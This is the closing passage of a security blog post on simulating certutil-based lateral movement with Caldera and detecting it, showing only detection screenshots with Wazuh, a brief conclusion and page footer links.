</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">89</span><span>}
</span></span></code></pre></div><p><strong>Detection:</strong></p><p><strong>ad-dc</strong></p><p><img src=/images/calderacertutil/17.png alt=certutil></p><p><img src=/images/calderacertutil/18.png alt=certutil></p><p>Here is a Wazuh output for this attack simulation.</p><p><img src=/images/calderacertutil/19.png alt=certutil></p><p>In this attack simulation, we explored <strong>certutil</strong> and its use in malicious attacks, then we saw its effects and how to detect them.</p><p>Thank you for taking the time to read this article. I hope you find it useful.</p><p>Keep up the good work.</p></div></article><div id=footer-post-container><div id=footer-post><div id=nav-footer style=display:none><ul><li><a href=/>Home</a></li><li><a href=/posts>Posts</a></li><li><a href=/walkthroughs>Walkthroughs</a></li><li><a href=/projects>Projects</a></li><li><a href=/resources>Resources</a></li><li><a href=/library>Library</a></li><li><a href=/about>About</a></li></ul></div><div id=toc-footer style=display:none><nav id=TableOfContents><ul><li><a href=#step-1-local-fqdn><strong>Step 1: Local FQDN</strong></a></li><li><a href=#step-2-discover-local-hosts><strong>Step 2: Discover local hosts</strong></a></li><li><a href=#step-3-lateral-movement---certutil><strong>Step 3: Lateral Movement - Certutil</strong></a></li></ul></nav></div><div id=share-footer style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f" aria-label=Facebook><i class="fab fa-facebook fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&text=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation" aria-label=Twitter><i class="fab fa-twitter fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&title=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation" aria-label=Linkedin><i class="fab fa-linkedin fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&is_video=false&description=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation" aria-label=Pinterest><i class="fab fa-pinterest fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation&body=Check out this article: https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f" aria-label=Email><i class="fas fa-envelope fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&title=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation" aria-label=Pocket><i class="fab fa-get-pocket fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&title=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation" aria-label=reddit><i class="fab fa-reddit fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&name=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation&description=%3cp%3eHi%20everyone%2c%20in%20this%20article%20I%20will%20perform%20an%20attack%20scenario%20using%20Caldera%20and%20show%20you%20its%20effects%20on%20victim%20machines%20using%20LimaCharlie%20as%20EDR.%3c%2fp%3e%0a%3cp%3eI%20will%20use%20an%20adversary%20template%20called%20%3cstrong%3eLateral%20Movement%20-%20Certutil%3c%2fstrong%3e%20in%20Caldera%20which%20consists%20of%20three%20steps%20shown%20below.%3c%2fp%3e%0a%3cp%3e%3cstrong%3eStep%201%3a%3c%2fstrong%3e%20Local%20FQDN%3c%2fp%3e%0a%3cpre%20tabindex%3d%220%22%3e%3ccode%3eDescription%3a%20Uses%20Windows%20libraries%20to%20get%20the%20FQDN%20of%20the%20infected%20host%0aTactic%3a%20Discovery%0aTechnique%20Name%3a%20Host%20Discovery%0aTechnique%20ID%3a%20TA0007%0a%3c%2fcode%3e%3c%2fpre%3e%3cp%3e%3cstrong%3eCommand%3a%3c%2fstrong%3e%3c%2fp%3e" aria-label=Tumblr><i class="fab fa-tumblr fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&t=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation" aria-label="Hacker News"><i class="fab fa-hacker-news fa-lg" aria-hidden=true></i></a></li></ul></div><div id=actions-footer><a id=menu-toggle class=icon href=# onclick='return $("#nav-footer").toggle(),!1' aria-label=Menu><i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick='return $("#toc-footer").toggle(),!1' aria-label=TOC><i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick='return $("#share-footer").toggle(),!1' aria-label=Share><i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a></div></div></div><footer id=footer><div class=footer-left>Copyright &copy; 2025 ittechnetworkk</div><div class=footer-right><nav><ul><li><a href=/>Home</a></li><li><a href=/posts>Posts</a></li><li><a href=/walkthroughs>Walkthroughs</a></li><li><a href=/projects>Projects</a></li><li><a href=/resources>Resources</a></li><li><a href=/library>Library</a></li><li><a href=/about>About</a></li></ul></nav></div></footer></div></body><link rel=stylesheet href=/lib/font-awesome/css/all.min.css><script src=/lib/jquery/jquery.min.js></script><script src=/js/main.js></script><script src=/js/lightbox.js></script><script src=/js/code-copy.js></script></html>